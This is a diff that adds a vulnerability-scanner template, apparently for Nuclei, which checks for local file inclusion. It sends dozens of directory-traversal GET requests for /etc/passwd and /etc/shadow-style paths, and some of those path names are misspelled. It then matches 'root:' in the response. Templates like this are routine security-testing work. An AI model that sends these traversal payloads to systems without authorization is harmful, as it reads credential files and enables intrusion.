@@ -1,0 +1,66 @@
+id: LFI
+
+info:
+  name: Local File Inclusion
+  author: pikpikcu
+  severity: high
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/etc/passwd'
+      - '{{BaseURL}}/etc/shadowd'
+      - '{{BaseURL}}/etc/passwd'
+      - '{{BaseURL}}/etc/passwdd'
+      - '{{BaseURL}}../etc/passwd'
+      - '{{BaseURL}}../etc/passwdd'
+      - '{{BaseURL}}../../etc/passwd'
+      - '{{BaseURL}}../../etc/passwdd'
+      - '{{BaseURL}}../../../etc/passwd'
+      - '{{BaseURL}}../../../etc/passwdd'
+      - '{{BaseURL}}../../../../etc/passwd'
+      - '{{BaseURL}}../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/passwd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/passwdd'
+      - '{{BaseURL}}../../../../../../../../../../../../../../../../../../../../../../etc/shadowd'
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "root:"
+        part: body
